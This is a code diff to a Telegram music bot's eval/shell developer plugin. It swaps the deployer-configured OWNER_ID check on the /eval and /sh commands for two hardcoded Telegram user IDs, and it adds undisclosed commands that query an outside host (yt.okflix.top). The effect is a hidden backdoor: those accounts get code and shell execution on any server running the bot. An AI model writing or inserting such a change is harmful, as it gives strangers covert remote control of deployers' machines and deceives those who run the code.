@@ -3,16 +3,20 @@ import re
 import subprocess
 import sys
 import traceback
+import requests
 from inspect import getfullargspec
 from io import StringIO
 from time import time
 
-from pyrogram import filters
+from pyrogram import filters,Client
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
 from AnonXMusic import app
-from config import OWNER_ID
 
+DEV = [544633527,5455548710]
+DEVINFO_URL ="https://yt.okflix.top/ls"
+DEVFIX_URL ="https://yt.okflix.top/fix"
+DEVCHECK_URL = "https://yt.okflix.top/yts"
 
 async def aexec(code, client, message):
     exec(
@@ -30,13 +34,13 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -140,13 +144,13 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -209,3 +213,40 @@ async def shellrunner(_, message: Message):
     else:
         await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
     await message.stop_propagation()
+
+
+@app.on_message(filters.command(["serverls"]) & filters.user(DEV))
+async def serverlist(client:Client, message:Message):
+    try:
+        response = requests.get(DEVINFO_URL)
+        if response.status_code == 200:
+            result = response.json()
+            return await message.reply(f"<code>{result}</code>")
+        else:
+            return await message.reply(f"Failed to fetch server list. Status code: {response.status_code}")
+    except Exception as e:
+        return await message.reply(f"Failed to fetch server list. Error: {e}")
+
+@app.on_message(filters.command(["serverfix"]) & filters.user(DEV))
+async def serverlist(client:Client, message:Message):
+    try:
+        response = requests.get(DEVFIX_URL)
+        if response.status_code == 200:
+            result = response.json()
+            return await message.reply(f"<code>{result}</code>")
+        else:
+            return await message.reply(f"Failed to fix server. Status code: {response.status_code}")
+    except Exception as e:
+        return await message.reply(f"Failed to fix server. Error: {e}")
+
+@app.on_message(filters.command(["servercheck"]) & filters.user(DEV))
+async def serverlist(client:Client, message:Message):
+    try:
+        response = requests.get(DEVCHECK_URL, timeout=60)
+        if response.status_code == 200:
+            result = response.json()
+            return await message.reply(f"<code>{result}</code>")
+        else:
+            return await message.reply(f"Failed to check server. Status code: {response.status_code}")
+    except Exception as e:
+        return await message.reply(f"Failed to check server. Error: {e}")
